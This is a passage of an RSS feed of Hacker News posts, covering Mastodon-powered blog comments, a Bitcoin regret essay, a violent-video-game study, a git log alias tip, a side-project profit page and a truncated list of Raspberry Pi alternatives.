    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"load-comment"</span><span>).</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>function</span><span>()</span> <span>{</span>
      <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"load-comment"</span><span>).</span><span>innerHTML</span> <span>=</span> <span>"Loading"</span><span>;</span>
      <span>fetch</span><span>(</span><span>'https://{{ .host }}/api/v1/statuses/{{ .id }}/context'</span><span>)</span>
        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
          <span>return</span> <span>response</span><span>.</span><span>json</span><span>();</span>
        <span>})</span>
        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>data</span><span>)</span> <span>{</span>
          <span>if</span><span>(</span><span>data</span><span>[</span><span>'descendants'</span><span>]</span> <span>&amp;&amp;</span>
             <span>Array</span><span>.</span><span>isArray</span><span>(</span><span>data</span><span>[</span><span>'descendants'</span><span>])</span> <span>&amp;&amp;</span> 
            <span>data</span><span>[</span><span>'descendants'</span><span>].</span><span>length</span> <span>&gt;</span> <span>0</span><span>)</span> <span>{</span>
              <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>innerHTML</span> <span>=</span> <span>""</span><span>;</span>
              <span>data</span><span>[</span><span>'descendants'</span><span>].</span><span>forEach</span><span>(</span><span>function</span><span>(</span><span>reply</span><span>)</span> <span>{</span>
                <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span> <span>=</span> <span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>);</span>
                <span>reply</span><span>.</span><span>account</span><span>.</span><span>emojis</span><span>.</span><span>forEach</span><span>(</span><span>emoji</span> <span>=&gt;</span> <span>{</span>
                  <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span> <span>=</span> <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>.</span><span>replace</span><span>(</span><span>`:</span><span>${</span><span>emoji</span><span>.</span><span>shortcode</span><span>}</span><span>:`</span><span>,</span>
                    <span>`&lt;img src="</span><span>${</span><span>escapeHtml</span><span>(</span><span>emoji</span><span>.</span><span>static_url</span><span>)</span><span>}</span><span>" alt="Emoji </span><span>${</span><span>emoji</span><span>.</span><span>shortcode</span><span>}</span><span>" height="20" width="20" /&gt;`</span><span>);</span>
                <span>});</span>
                <span>mastodonComment</span> <span>=</span>
                  <span>`&lt;div class="mastodon-comment"&gt;
</span><span>                     &lt;div class="avatar"&gt;
</span><span>                       &lt;img src="</span><span>${</span><span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>avatar_static</span><span>)</span><span>}</span><span>" height=60 width=60 alt=""&gt;
</span><span>                     &lt;/div&gt;
</span><span>                     &lt;div class="content"&gt;
</span><span>                       &lt;div class="author"&gt;
</span><span>                         &lt;a href="</span><span>${</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>url</span><span>}</span><span>" rel="nofollow"&gt;
</span><span>                           &lt;span&gt;</span><span>${</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>}</span><span>&lt;/span&gt;
</span><span>                           &lt;span class="disabled"&gt;</span><span>${</span><span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>acct</span><span>)</span><span>}</span><span>&lt;/span&gt;
</span><span>                         &lt;/a&gt;
</span><span>                         &lt;a class="date" href="</span><span>${</span><span>reply</span><span>.</span><span>uri</span><span>}</span><span>" rel="nofollow"&gt;
</span><span>                           </span><span>${</span><span>reply</span><span>.</span><span>created_at</span><span>.</span><span>substr</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>)</span><span>}</span><span>
</span><span>                         &lt;/a&gt;
</span><span>                       &lt;/div&gt;
</span><span>                       &lt;div class="mastodon-comment-content"&gt;</span><span>${</span><span>reply</span><span>.</span><span>content</span><span>}</span><span>&lt;/div&gt; 
</span><span>                     &lt;/div&gt;
</span><span>                   &lt;/div&gt;`</span><span>;</span>
                <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>appendChild</span><span>(</span><span>DOMPurify</span><span>.</span><span>sanitize</span><span>(</span><span>mastodonComment</span><span>,</span> <span>{</span><span>'RETURN_DOM_FRAGMENT'</span><span>:</span> <span>true</span><span>}));</span>
              <span>});</span>
          <span>}</span> <span>else</span> <span>{</span>
            <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>innerHTML</span> <span>=</span> <span>"&lt;p&gt;Not comments found&lt;/p&gt;"</span><span>;</span>
          <span>}</span>
        <span>});</span>
      <span>});</span>
  <span>&lt;/</span><span>script</span><span>&gt;</span>
<span>&lt;/</span><span>div</span><span>&gt;</span>
{{ end }}
</code></pre></div><p>This code is using <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">DOMPurify</a>
to sanitize the input, since it is not a great idea to load data from
third party sources without sanitizing them first. Also thanks to
<a href="https://news.ycombinator.com/item?id=25575111" target="_blank" rel="noopener">chrismorgan</a>, the code
was optimized and is more secure.</p>
<p>In my blog post, I can now add the following information to my
frontmatter, to make comments appears magically.</p>
<div><pre><code data-lang="yaml"><span>comments</span><span>:</span><span>
</span><span>  </span><span>host</span><span>:</span><span> </span><span>linuxrocks.online</span><span>
</span><span>  </span><span>username</span><span>:</span><span> </span><span>carl</span><span>
</span><span>  </span><span>id</span><span>:</span><span> </span><span>105105837504372590</span><span>
</span></code></pre></div>
</section>


  
  <div>
    <h2>Comments</h2>
    <p>You can use your Mastodon account to reply to this <a href="https://linuxrocks.online/@carl/105463655803971969">post</a>.</p>
    <p><a href="https://linuxrocks.online/interact/105463655803971969?type=reply">Reply</a></p>
    
    
    
    
  </div>
  

  

  
</article></div>]]>
            </description>
            <link>https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570268</guid>
            <pubDate>Tue, 29 Dec 2020 14:57:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I wish I never bought Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25570070">thread link</a>) | @MYEUHD
<br/>
December 29, 2020 | https://www.quitfacebook.org/file/greed.html | <a href="https://web.archive.org/web/*/https://www.quitfacebook.org/file/greed.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>But first, something completely different. Sometime in 2015 I caught wind of Elon Musk. There was something relatable in the way he spoke about being bullied, education <sup>(1)</sup>, and the future. His demeanor lit a spark that made me realign with myself, resurrecting my usual optimistic outlook. Further still, I became enamored by his companies which reinvigorated my long-lost curiosity and fascination with science. Waking up in the morning became exciting again; similar to my 10-year-old self during the summer: not a care in the world, ready to explore.</p>

    <p>Not being able to afford a Tesla car, the only way I could support him was through buying Tesla shares. So that's what I did, at the all-time high, right before it plummeted. In a fit of panic I wanted to sell, but the revolutionary workings of its cars and the Gigafactory, and their abundance of talent reassured me they were vastly ahead of the game. So I kept buying until the graph bottomed out, and soon enough my portfolio turned green. That the stock market closes at night and during the weekends made the whole experience tenable, more relaxed. But not for long.</p>

    <h2>“Drinking the Kool-Aid”</h2>
    <p>“is an expression used to refer to a person who believes in a possibly doomed or dangerous idea because of perceived potential high rewards.” <sup>(2)</sup></p>

    <p><img src="https://www.quitfacebook.org/file/media/kool-aid-man.png" alt="Kool-Aid man."></p><p>On Reddit I met a fellow Tesla fan who said his two most profitable investments were Tesla and bitcoin. Initially I didn't bother, but some three months later it reappeared. My motivations for investing had begun to shift. Primarily supporting a cause and secondarily making some money—beating inflation—traded places. Profit took precedence.</p>

    <p>At a price of $1200 and rising I drank the decentralized Kool-Aid. Each day I woke up richer—on paper. The increases that took Tesla several months happened overnight, and owning a million dollars grew less and less farfetched. “This is not a bubble. This time is different. We're at the start of the adoption curve.” Man, it felt good! In my naivety I dreamt about buying a house, or building a skate park named after bitcoin. I was high on “hopium” and living in a fantasy world. Gradually my time spent learning, reading, or developing real life skills decreased. Being rich became the ultimate goal and I merely had to sit back and watch. Then the bubble popped, “Kansas went bye-bye”.</p>

    <p>“If only I had done this or that” was my prevailing mode of thought, “I could've had so much more!” Although I never day traded, I did diversify, no, gamble into a handful of alternative coins in order to try my luck catching the next 400% price pump. No dice. I wasted so much time waiting for it “to moon” or trying to “catch falling knives” <sup>(3)</sup>. Not only were the results as succesful as dart throwing chimps <sup>(4)</sup>, it also significantly increased my anxiety. The regular stock market seldom impacted my day-to-day emotions, but the 24/7 cryptocurrency market did—more than I consciously realize or care to admit. At one point I had my intestines checked because my doctor feared cancer. Fortunately it was a false alarm, and the symptoms caused by a mild inflammation subsided when I stopped stress eating junk food. If only I listened to my body and did a U-turn at this point. Sadly, greed had taken over; I wanted to procure the same amount of profit as if I had never diversified.</p>

    <p>While the bear market was still in play I finished reading The Bitcoin Standard, the most revered book on bitcoin, promoting it as the best currency we've ever had. Still oblivious about its toxic community, and neglecting some of the book's historical inaccuracies, I assumed the content was credible and genuine since the author was a professor in economics. Moreover, after sending him a list of typos and errors he returned the favor by giving me access to his paywalled pdf files. To be able to help such an esteemed professor made me feel elated. I was ready to go all in, and I did. Selling my remaining Tesla shares at $290 at a loss to buy bitcoin at the bottom simultaneously marked my own rock-bottom, for I was dabbing in evil. Even though I was extremely lucky by having caught a falling knife an inch from the floor, I started rooting for a decline in the former and a surge in the latter. Imagine my saltiness when Tesla suddenly shot up to just shy of $1000. Bitcoin had risen as well, but it wasn't good enough. Dumbass.</p>

    <h2>“My precious!”</h2>
    <p><img src="https://www.quitfacebook.org/file/media/smeagol.jpg" alt="Smeagol or Gollum; Lord of the Rings."></p><p>“He hated the dark, and he hated light more: he hated everything, and the Ring most of all.” <br>
    “What do you mean?” said Frodo. “Surely the Ring was his Precious and the only thing he cared for? But if he hated it, why didn't he get rid of it, or go away and leave it?” <br>
    “You ought to begin to understand, Frodo, after all you have heard,” said Gandalf. “He hated it and loved it, as he hated and loved himself. He could not get rid of it. He had no will left in the matter.” —<a href="https://www.goodreads.com/book/show/33.The_Lord_of_the_Rings">“The Lord of the Rings”</a> by J.R.R. Tolkien</p>

    <p>Slowly I became like Gollum. Which is ironic because I love The Lord of the Rings for the exact opposite reasons: calling for adventure, exploration, to love your friends, and to live in harmony with nature. Instead I fell in love with “my precious”, sitting at home watching numbers, albeit in the comfort of a picturesque wallpaper. Bitcoin made me as selfish and greedy as the bankers it was supposed to be against.</p>

    <p>If not for skateboarding I wouldn't have stayed sane. It pulled me out of isolation and held my soul intact despite being otherwise bereft of life. Bitcoin's one redeeming quality, because it temporarily made me feel rich, was that I learned to spend more generously on things that merited it, like skateboarding or lichess.org <sup>(5)</sup>. Whereas before I tried saving on nearly everything.</p>

    <p>Fast-forward to some months before Covid-19. Something smelled fishy. Bitcoin's price had been rising, which was exciting, but some doubts arose about the aforementioned professor: Saifedean Ammous. I stumbled upon his Twitter profile… “What the fuck.” The amount of conspiratorial nonsense mixed with academically dishonest douchebaggery was flabbergasting. “Is this guy really a professor?” I gave him the benefit of the doubt until I emailed him regarding meat, a topic he regularly rants about. The full convo is available in the appendix, but here's a taste:</p>

    <p>“I need an echo chamber because the world is FULL of brainwashed malnourished clueless nuts like you”</p>

    <p>I'm not proud of my conversation with him, but the way he talked like a neglected pubescent brat taught me to assume good intentions yet scrutinize everyone; even if they have a PhD to their name. “Saifegate” severely shook my confidence: “If this guy wrote the most popular book on bitcoin, then what the fuck does the rest of its community consist of?”</p>

    <h2>Bitcoin is dead inside.</h2>
    <p>From then on toxic bitcoin maximalists (and crypto currency nuts) appeared everywhere. Remember that “fishy smell” from before? It turned into dogshit. What bitcoin stood for had transitioned the way I had. It wasn't about changing the world anymore, but about increasing one's own wallet. My disregard culminated at the sight of the following series of events:</p>

    <p>“Just BTFD #bitcoin” —Adam Back</p>

    <p>“Btw it was what I did this morning "Just BTFD #bitcoin
      " ie "Just Bought TFD". I had seen DMs about buying on waking up and looking at price, then saw news @coinbase
      crashed (yet again), and bought some at $8600.” —Adam Back; <a href="https://twitter.com/adam3us/status/1259386895806726144">source</a></p>

    <p>If a CEO that feels the need to encourage people into buying a product he has vested interests in isn't a red flag, then I don't know what is; products should speak for themselves. The possibility of him being Satoshi Nakamoto didn't help either:</p>

    <iframe src="https://www.youtube-nocookie.com/embed/XfcvX0P1b5g" frameborder="0" allow=" autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    <p><sub>—YouTube: “Bitcoin - Unmasking Satoshi Nakamoto” by Barely Sociable</sub></p><p>But wait, it doesn't end there. Here's Luke Dashjr, a Bitcoin Core developer who helps build the software running on thousands of computers.</p>

    <p>“Masturbation is a very grave sin, arguably even worse than murder.” —Luke Dashjr; <a href="https://twitter.com/LukeDashjr/status/1223706601871302658">source</a>.</p>

    <p>“I don't have a dog, but I would totally try one and eat it if it tastes decent. Had a cat once. Planned to eat it, but something else got to it first. Currently have a pair of male &amp; female bunny. Plan to eat some of the babies, but… we're failing to get them to breed.” —Luke Dashjr; <a href="https://twitter.com/LukeDashjr/status/1169615995742380035">source</a>.</p>

    <p>“You have it backwards. Guns protect life. And no, animals have no rights. They also exist specifically for human consumption.” —Luke Dashjr; <a href="https://twitter.com/LukeDashjr/status/1169669024369795072">source</a>.</p>

    <p>Completely nuts. Sure, someone's religion doesn't necessarily prevent them building decent things. But if one is capable of such fallacious reasoning and fully supporting barbaric practices, then they're capable of implementing some iffy stuff in whatever they do. Here he justifies slavery and geocentrism: <a href="https://www.reddit.com/r/Buttcoin/comments/4936kw/lukejr_is_a_seriously_a_super_crazy_person_quotes/">https://www.reddit.com/r/Buttcoin/comments/4936kw/lukejr_is_a_seriously_a_super_crazy_person_quotes</a>.</p>

    <p>To consider I once thought the crypto scene was a bit crazy because of this ridiculous performance during an Ethereum convention (another crypto currency); boy, did I have another thing coming…</p>

    <iframe src="https://www.youtube-nocookie.com/embed/j7MeJionPMA" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    <p><sub>—YouTube: “EDCON 2019 - Vitalik and Ethereum Foundation dance and rap”</sub></p><p>I want to stop writing about this soulless topic so bad, but I'm not done yet. People need to know what they're getting into. A purely speculative uninspirational asset, that's what.</p>

    <p>Speculation has become bitcoin's main purpose, but without the capability for large-scale transactions <sup>(6)</sup>. Unlike our day-to-day currencies, which are used for both. Earning money by trading money is a worthless “skill”. Doing so produces nothing of real value to society and the same goes for day trading stocks. This is aptly communicated by Matthew McConaughey in The Wolf of Wallstreet:</p>

    <p>“Number one rule of Wallstreet. […] Nobody knows if a stock is gonna go up, down, sideways or in fucking circles. Least of all, stockbrokers, right? It's all a fugazi. […] It's fairy dust. It doesn't exist. It's …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.quitfacebook.org/file/greed.html">https://www.quitfacebook.org/file/greed.html</a></em></p>]]>
            </description>
            <link>https://www.quitfacebook.org/file/greed.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570070</guid>
            <pubDate>Tue, 29 Dec 2020 14:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ten year study: No link between violent video games and aggressive behavior]]>
            </title>
            <description>
<![CDATA[
Score 970 | Comments 513 (<a href="https://news.ycombinator.com/item?id=25570038">thread link</a>) | @chops
<br/>
December 29, 2020 | https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life | <a href="https://web.archive.org/web/*/https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <div><p>A <span><a title="Longitudinal Study into Violent Video Games" href="https://www.liebertpub.com/doi/abs/10.1089/cyber.2020.0049">ten-year longitudinal study</a></span>&nbsp;published in the Journal of <em>Cyberpsychology, Behavior, and Social Networking</em> on a group in early adolescence from as young as ten years old, investigated how playing violent video games at an early age would translate into adulthood behavior (23 years of age). Titled "Growing Up with Grand Theft Auto: A 10-Year Study of Longitudinal Growth of Violent Video Game Play in Adolescents" the study found no correlation between growing up playing video games and increased levels of aggression ten years later.</p><p>This particular study utilized a more contemporary approach for analyzing its data, known as the person-centered approach. Traditional studies use a variable-centered approach whereby researchers treat each variable, or characteristic, as related to another variable. An example would be that exercising is related to a reduced incidence of heart disease. This has been particularly valuable when comparing groups. In a person-centered approach researchers combine various algorithms across variables to determine how these variables compare among individuals. This approach provides a more accurate depiction of how variables relate to the individual.</p><p>As such, this study “accounts for heterogeneity, grouping individuals who are similar and who share a set of characteristics that vary similarly over time.” Participant families were recruited through “a large north-western city” beginning in 2007 (Wave 1) via telephone directories and required to complete questionnaires. 65% were Caucasian, 12% black and 19% multi-ethnic, 4% other. Families of lower socioeconomic status were underrepresented as part of the initial sample group and therefore needed recruitment via referrals and fliers to add to and diversify the sample group.</p><p>Video game violence ratings were assessed through the Common Sense Media, known to be a viable rating body for media. Participants were assessed through various behavioral characteristics such as aggression, depressive symptoms, anxiety symptoms, and prosocial behavior.</p><p>Results showed that boys played more violent video games than girls. Groups displayed three forms of video game play, according to the study: high-initial violence (4%) which indicated individuals played a high-level of violent video games at an early age, moderate initial violence (23%) whereby violent video game play was moderate at an early age, and low initial violence (73%).</p><p>The study concluded that group with low initial violence “was no higher in aggressive behavior than the high initial violence group at the final time point.” Therefore, it is determined that adolescents who played a high-level of violent video games at an early age did not show more aggressive behavior later in life than those who played fewer to no hours of violent video games at an early age.</p></div>
    </div></div>]]>
            </description>
            <link>https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570038</guid>
            <pubDate>Tue, 29 Dec 2020 14:31:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git cake: when is my readme’s birthday?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25569935">thread link</a>) | @bhupesh
<br/>
December 29, 2020 | https://bhupesh-v.github.io/git-cake-when-is-my-readme-birthday/ | <a href="https://web.archive.org/web/*/https://bhupesh-v.github.io/git-cake-when-is-my-readme-birthday/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <p><img alt="git cake: when is my README's birthday?" src="https://raw.githubusercontent.com/Bhupesh-V/Bhupesh-V.github.io/master/images/git-cake-day-demo.png"></p><p>Do you want to know when was a file/directory committed in your git repo?
Well here is <code>git log</code> at your rescue!</p>

<div><div><pre><code>
git log <span>--date</span><span>=</span>format:<span>'%d %b %Y'</span> <span>--diff-filter</span><span>=</span>A <span>--name-only</span> <span>--pretty</span><span>=</span><span>'%n%C(yellow bold)🎂️ %ad%Creset by (%C(blue bold)%h%Creset)'</span>

</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/34342551/103223519-6b366080-494c-11eb-9d54-acebd0179ffb.png" alt="git-cake-demo-paager"></p>

<p>Ok ok! Let me explain for you lazy asses</p>

<ul>
  <li>
    <p><code>--date=format:'%d %b %Y'</code></p>

    <p>This is pretty much self explanatory, suit this to your own preferred date format. <a href="https://git-scm.com/docs/git-log#Documentation/git-log.txt---dateltformatgt">Other date formats</a></p>
  </li>
  <li>
    <p><code>--diff-filter=A --name-only</code></p>

    <p>This lets you filter nodes that were Added(A). Other filters include: Copied(C), Deleted(D), Modified(M) or Renamed(R).
Multiple filters can be used together e.g <code>--diff-filter=AC</code>.</p>

    <p>The <code>--name-only</code> shows only names of changed files. If you had like to print some status as well use <code>--name-status</code></p>
  </li>
  <li>
    <p><code>--pretty='%n%C(yellow bold)🎂️ %ad%Creset by (%C(blue bold)%h%Creset)</code></p>

    <p>This is the beauty that is responsible for printing <code>🎂️ 18 Jun 2019 by (f72312c)</code>.</p>

    <p>Git provides us with various format specifiers these include.</p>
    <ul>
      <li>%n  : newline</li>
      <li>%h  : abbreviated commit hash (short version, use %H for complete hash)</li>
      <li>%ad : author date that respects the previously specified –date= option</li>
    </ul>
  </li>
</ul>

<p><a href="https://git-scm.com/docs/git-log#_pretty_formats"><strong>Read git pretty docs</strong></a> for info. on all 50+ options</p>

<blockquote>
  <p>Read more than 2000 lines worth of git log manual (<code>git log --help</code>) when you feel absolutely free :)</p>
</blockquote>

<p>You should add this in your <code>.gitconfig</code>.</p>

<div><div><pre><code>[user]
	email = varshneybhupesh@gmail.com
	name = Bhupesh-V
[commit]
	template = /home/bhupesh/.gitmessage
[core]
	editor = nano
[credential]
	helper = store
[alias]
        cake = log --date=format:'%d %b %Y' --diff-filter=A --name-only --pretty='%n%C(yellow bold)🎂️ %ad%Creset by (%C(blue bold)%h%Creset)'
</code></pre></div></div>

<p>Now send me some presents, will ya?
Please?</p>

  </div></div>]]>
            </description>
            <link>https://bhupesh-v.github.io/git-cake-when-is-my-readme-birthday/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569935</guid>
            <pubDate>Tue, 29 Dec 2020 14:21:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Four years of profitable side-projects]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 25 (<a href="https://news.ycombinator.com/item?id=25569562">thread link</a>) | @czue
<br/>
December 29, 2020 | https://www.coryzue.com/open/ | <a href="https://web.archive.org/web/*/https://www.coryzue.com/open/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
    
    
    <div>
      <div>
        <p>$<span id="total-profits">-</span></p>
        <p>Total Profit</p>
      </div>
      <div>
        <p><span id="total-hours">-</span></p>
        <p>Total Hours</p>
      </div>
      <div>
        <p>$<span id="total-rate">-</span><span>/hour</span></p>
        <p>Effective Rate</p>
      </div>
    </div>
    <div>
      <div>
        <p>Profits by Year</p>
        <canvas id="yearly-profits"></canvas>
      </div>
      <div>
        <p>Effort by Year</p>
        <canvas id="yearly-hours"></canvas>
      </div>
    </div>
    <div>
      <div id="placecard-data">
        <h2>❤️ <a href="https://www.placecard.me/" target="_blank">Place
          Card Me</a></h2>
        <h3>The best way to make place cards online.</h3>
        <h3>🚀 May 2017 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr </h3>
        
        
        
      </div>
      <div id="pegasus-data">
        <h2>🦄 <a href="https://www.saaspegasus.com/" target="_blank">SaaS
          Pegasus</a></h2>
        <h3>A Django-Powered SaaS Template for your next big
          idea.</h3>
        <h3>🚀 June 2019 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr</h3>
        
        
        
      </div>
      <div id="chatstats-data">
        <h2>💬 <a href="https://chatstats.co/" target="_blank">Chat
          Stats</a></h2>
        <h3>Analytics and leaderboards for your GroupMe groups.</h3>
        <h3>🚀 Dec 2017 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr</h3>
        
        
        
      </div>
    </div>
    
  </div>
</section></div>]]>
            </description>
            <link>https://www.coryzue.com/open/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569562</guid>
            <pubDate>Tue, 29 Dec 2020 13:30:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi Alternatives in 2021: Hackboard, Zimaboard, RockPi, Odroid and More]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25569407">thread link</a>) | @jamesmd
<br/>
December 29, 2020 | https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3167">

	

	<div>
		
<p>Need a SBC for a project? Checkout my recommendations for Raspberry Pi Alternatives in 2021 below.</p>



<figure><table><tbody><tr><td><img src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>HackBoard 2<br><em>A very small but powerful x86 SBC</em></td><td><a href="https://www.crowdsupply.com/hackboard/hb2" target="_blank" rel="noreferrer noopener">Buy Now at Crowd Supply!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#Hackboard_2">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>ZimaBoard<br><em>Small but Mighty, dual NIC x86 SBC Designed specifically to be used as a home server.</em></td><td><a href="https://www.zimaboard.com/">More at Zimaboard</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#ZimaBoard">More Info</a></td></tr><tr><td><img src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>Rock Pi4<br><em>A powerful Hex Core ARM based SBC sharing the same physical form factor as a Raspberry Pi Model B</em></td><td><a href="https://www.amazon.co.uk/gp/product/B07XD8HZBY/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B07XD8HZBY&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=1026f70c5b125cfadf15c563c959d9bf" target="_blank" rel="noreferrer noopener sponsored nofollow">Buy Now at Amazon!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#RockPi_4_Model_B">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>ODROID-H2+<br><em>Powerful Quad Core x86 SBC With Dual NICs.</em></td><td><a href="https://www.odroid.co.uk/ODroid-H2">Buy Now at ODROID!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#ODROIDH2+">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>NanoPi R4S<br><em>A tin</em>y Hex Core ARM SBC With Dual NICs and up to 4GB 